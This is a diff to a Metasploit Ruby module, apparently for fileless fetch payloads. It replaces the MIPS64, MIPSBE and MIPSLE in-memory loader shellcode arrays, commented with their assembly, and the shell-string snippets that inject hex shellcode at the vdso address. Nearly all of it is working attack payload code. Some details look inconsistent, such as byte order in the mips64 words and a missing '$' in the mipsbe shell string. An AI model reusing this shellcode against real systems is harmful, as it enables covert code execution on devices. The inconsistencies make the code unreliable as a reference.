@@ -100,58 +100,45 @@ module Msf::Payload::Adapter::Fetch::Fileless
       payload = in_memory_loader_asm.pack("V*")
     when 'mips64'
       in_memory_loader_asm = [
-          0xfcffa0af, #0x1000:	sw	$zero, -4($sp)	0xfcffa0af
-          0xfcffbd27, #0x1004:	addiu	$sp, $sp, -4	0xfcffbd27
-          0x2020a003, #0x1008:	add	$a0, $sp, $zero	0x2020a003
-          0xfeff1924, #0x100c:	addiu	$t9, $zero, -2	0xfeff1924
-          0x27282003, #0x1010:	not	$a1, $t9	0x27282003
-          0x02110224, #0x1014:	addiu	$v0, $zero, 0x1102	0x02110224
-          0x0c000000, #0x1018:	syscall		0x0c000000
-          0x2528e003, #0x101c:	move	$a1, $ra	0x2528e003
-          0xfd0f0224, #0x1020:	addiu	$v0, $zero, 0xffd	0xfd0f0224
-          0x0c000000, #0x1024:	syscall		0x0c000000
-          0xbd0f0224, #0x1028:	addiu	$v0, $zero, 0xfbd	0xbd0f0224
-          0x0c000000, #0x102c:	syscall		0x0c000000
+          0x2520a003, #0x1000:	move	$a0, $sp	0x2520a003
+          0x01000524, #0x1004:	addiu	$a1, $zero, 1	0x01000524
+          0xc2140224, #0x1008:	addiu	$v0, $zero, 0x14c2	0xc2140224
+          0x0c010101, #0x100c:	syscall	0x40404	0x0c010101
+          0x2520e003, #0x1010:	move	$a0, $ra	0x2520e003
+          0xd3130224, #0x1014:	addiu	$v0, $zero, 0x13d3	0xd3130224
+          0x0c010101, #0x1018:	syscall	0x40404	0x0c010101
+          0xa9130224, #0x101c:	addiu	$v0, $zero, 0x13a9	0xa9130224
+          0x0c010101, #0x1020:	syscall	0x40404	0x0c010101
       ]
-      payload = in_memory_loader_asm.pack('V*')
+      payload = in_memory_loader_asm.pack('N*')
     when 'mipsbe'
       in_memory_loader_asm = [
-          0xafa0fffc, #0x1000:	sw	$zero, -4($sp)	0xafa0fffc
-          0x27bdfffc, #0x1004:	addiu	$sp, $sp, -4	0x27bdfffc
-          0x03a02020, #0x1008:	add	$a0, $sp, $zero	0x03a02020
-          0x2419fffe, #0x100c:	addiu	$t9, $zero, -2	0x2419fffe
-          0x03202827, #0x1010:	not	$a1, $t9	0x03202827
-          0x24021102, #0x1014:	addiu	$v0, $zero, 0x1102	0x24021102
-          0x0000000c, #0x1018:	syscall		0x0000000c
-          0x03e02825, #0x101c:	move	$a1, $ra	0x03e02825
-          0x24020ffd, #0x1020:	addiu	$v0, $zero, 0xffd	0x24020ffd
-          0x0000000c, #0x1024:	syscall		0x0000000c
-          0x24020fbd, #0x1028:	addiu	$v0, $zero, 0xfbd	0x24020fbd
-          0x0000000c, #0x102c:	syscall		0x0000000c
+          0x03a02025, #0x1000:	move	$a0, $sp	0x03a02025
+          0x24050001, #0x1004:	addiu	$a1, $zero, 1	0x24050001
+          0x24021102, #0x1008:	addiu	$v0, $zero, 0x1102	0x24021102
+          0x0101010c, #0x100c:	syscall	0x40404	0x0101010c
+          0x03e02025, #0x1010:	move	$a0, $ra	0x03e02025
+          0x24020ffd, #0x1014:	addiu	$v0, $zero, 0xffd	0x24020ffd
+          0x0101010c, #0x1018:	syscall	0x40404	0x0101010c
+          0x24020fbd, #0x101c:	addiu	$v0, $zero, 0xfbd	0x24020fbd
+          0x0101010c, #0x1020:	syscall	0x40404	0x0101010c
+
       ]
       payload = in_memory_loader_asm.pack('V*')
     when 'mipsle'
       in_memory_loader_asm = [
-          0xfcffa0af, #0x1000:	sw	$zero, -4($sp)	0xfcffa0af
-          0xfcffbd27, #0x1004:	addiu	$sp, $sp, -4	0xfcffbd27
-          0x2020a003, #0x1008:	add	$a0, $sp, $zero	0x2020a003
-          0xfeff1924, #0x100c:	addiu	$t9, $zero, -2	0xfeff1924
-          0x27282003, #0x1010:	not	$a1, $t9	0x27282003
-          0x02110224, #0x1014:	addiu	$v0, $zero, 0x1102	0x02110224
-          0x0c000000, #0x1018:	syscall		0x0c000000
-          0x2528e003, #0x101c:	move	$a1, $ra	0x2528e003
-          0xfd0f0224, #0x1020:	addiu	$v0, $zero, 0xffd	0xfd0f0224
-          0x0c000000, #0x1024:	syscall		0x0c000000
-          0xbd0f0224, #0x1028:	addiu	$v0, $zero, 0xfbd	0xbd0f0224
-          0x0c000000, #0x102c:	syscall		0x0c000000
-      ]
+          0x2520a003, #0x1000:	move	$a0, $sp	0x2520a003
+          0x01000524, #0x1004:	addiu	$a1, $zero, 1	0x01000524
+          0x02110224, #0x1008:	addiu	$v0, $zero, 0x1102	0x02110224
+          0x0c010101, #0x100c:	syscall	0x40404	0x0c010101
+          0x2520e003, #0x1010:	move	$a0, $ra	0x2520e003
+          0xfd0f0224, #0x1014:	addiu	$v0, $zero, 0xffd	0xfd0f0224
+          0x0c010101, #0x1018:	syscall	0x40404	0x0c010101
+          0xbd0f0224, #0x101c:	addiu	$v0, $zero, 0xfbd	0xbd0f0224
+          0x0c010101, #0x1020:	syscall	0x40404	0x0c010101
+]
       payload = in_memory_loader_asm.pack('V*')
-    # PPC shellcode
-    # bl 8
-    # mflr    r1
-    # lwz     r3,16(r1)
-    # mtlr    r3
-    # blr
+
     when 'ppc'
       in_memory_loader_asm = [
           0x0000c039, #0x1000:	li	r14, 0	0x0000c039
@@ -228,12 +215,28 @@ module Msf::Payload::Adapter::Fetch::Fileless
     when 'armbe'
       %^"f8df20044710"$(echo $(printf %04x $vdso_addr))^
     
+    # MIPSEL shellcode
+    # bgezal $zero, 4
+    # xor $t2, $t2,$t2
+    # lw	$t2, 16($ra)
+    # jr $t2
     when 'mipsle'
-      %^$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"09340800200100000000"^
+      %^"000011040000000026504a011000ea8f0800400100000000"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+    
+    # MIPSBE shellcode
+    # bgezal $zero, 4
+    # xor $t2, $t2,$t2
+    # lw	$t2, 16($ra)
+    # jr $t2
     when 'mipsbe'
-      %^"2409"$(echo (printf %04x $vdso_addr))"0120000800000000"^
+      %^"0411000000000000014a50268fea00100140000800000000"$(echo (printf %04x $vdso_addr))^
+    # MIPS64 shellcode
+    # bgezal $zero, 4
+    # xor $t2, $t2,$t2
+    # ld	$t2, 16($ra)
+    # jr $t2
     when 'mips64'
-      %^$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"09340800200100000000"^
+      %^"00001104000000002670ce011000eedf0800c00100000000"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
     
     # PPC shellcode
     # bl 4
